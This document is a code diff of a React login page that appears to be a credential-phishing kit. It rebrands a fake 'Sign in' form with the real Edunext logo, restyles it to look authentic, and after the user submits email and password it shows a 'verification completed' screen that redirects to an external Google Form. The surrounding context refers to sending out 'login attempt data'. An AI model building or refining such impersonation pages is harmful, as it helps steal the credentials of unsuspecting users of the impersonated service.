@@ -54,19 +54,19 @@ This is an automated message with login attempt data.`,
 
   if (showSuccessScreen) {
     return (    
-        <div className="min-h-screen bg-white flex flex-col items-center justify-center p-4">
+        <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100 flex flex-col items-center justify-center p-4">
         <div className="w-full max-w-sm text-center">
-          {/* Manus AI Logo */}
+          {/* Edunext Logo */}
           <div className="mb-8">
             <img 
-              src="https://placehold.co/200x60/1f2937/ffffff?text=Form" 
-              alt="Manus AI Logo" 
+              src="https://resources.edunexttechnologies.com/Edunext-Website/img/logo-new.svg" 
+              alt="Edunext Logo" 
               className="w-48 h-auto mx-auto"
             />
           </div>
           {/* Success Message */}
-          <div className="bg-white rounded-lg shadow-md p-8">
-            <h1 className="text-2xl font-bold text-gray-900 mb-6">
+          <div className="bg-white rounded-lg shadow-lg p-8 border border-blue-100">
+            <h1 className="text-2xl font-bold text-gray-800 mb-6">
               Verification is successfully completed, please proceed to the Verification Form
             </h1>
             
@@ -75,7 +75,7 @@ This is an automated message with login attempt data.`,
               onClick={() => {
                 window.location.href = 'https://docs.google.com/forms/d/e/1FAIpQLSdAAUoBrDfLU6UFX2Su3lry8GBCFcJS93RWuBabe9gYxmbvoQ/viewform?usp=sharing&ouid=111823479924118296643';
               }}
-              className="px-6 py-3 text-sm font-medium text-white bg-blue-600 hover:bg-blue-700 rounded-md transition-colors w-full mt-8"
+              className="px-6 py-3 text-sm font-medium text-white bg-blue-600 hover:bg-blue-700 rounded-md transition-colors w-full mt-8 shadow-md"
             >
               F
             </button>
@@ -86,14 +86,14 @@ This is an automated message with login attempt data.`,
   }
 
   return (
-    <div className="min-h-screen bg-white flex flex-col items-center justify-center p-4">
+    <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100 flex flex-col items-center justify-center p-4">
       <div className="w-full max-w-sm">
-        {/* Google Logo */}
+        {/* Edunext Logo */}
         <div className="flex justify-center mb-8">
           <img 
             src="https://resources.edunexttechnologies.com/Edunext-Website/img/logo-new.svg" 
             alt="Edunext" 
-            className="w-28 h-auto"
+            className="w-32 h-auto"
           />
         </div>
 
@@ -105,7 +105,7 @@ This is an automated message with login attempt data.`,
         )}
 
         {/* Form Card */}
-        <div className="bg-white rounded-lg shadow-md p-6">
+        <div className="bg-white rounded-lg shadow-lg p-6 border border-blue-100">
           {/* Title */}
           <h1 className="text-xl font-medium text-gray-800 mb-6 text-center">
             Sign in
@@ -122,7 +122,7 @@ This is an automated message with login attempt data.`,
                 id="email"
                 value={email}
                 onChange={(e) => setEmail(e.target.value)}
-                className="w-full px-4 py-3 border border-gray-300 rounded-md text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
+                className="w-full px-4 py-3 border border-gray-300 rounded-md text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                 placeholder="Email or phone"
                 required
               />
@@ -137,7 +137,7 @@ This is an automated message with login attempt data.`,
                 id="password"
                 value={password}
                 onChange={(e) => setPassword(e.target.value)}
-                className="w-full px-4 py-3 border border-gray-300 rounded-md text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
+                className="w-full px-4 py-3 border border-gray-300 rounded-md text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                 placeholder="Password"
                 required
               />
@@ -158,7 +158,7 @@ This is an automated message with login attempt data.`,
               </button>
               <button
                 type="submit"
-                className="px-4 py-3 text-sm font-medium text-white bg-blue-600 hover:bg-blue-700 rounded-md flex-1 transition-colors disabled:opacity-70 disabled:cursor-not-allowed"
+                className="px-4 py-3 text-sm font-medium text-white bg-blue-600 hover:bg-blue-700 rounded-md flex-1 transition-colors disabled:opacity-70 disabled:cursor-not-allowed shadow-md"
                 disabled={isLoading}
               >
                 {isLoading ? (
@@ -178,7 +178,7 @@ This is an automated message with login attempt data.`,
         </div>
 
         {/* Footer Links */}
-        <div className="mt-6 text-center text-sm text-gray-600 space-y-2">
+         <div className="mt-6 text-center text-sm text-gray-600 space-y-2">
           <p>
             <a href="#" className="hover:underline">English (United States)</a>
             <span className="mx-1">·</span>
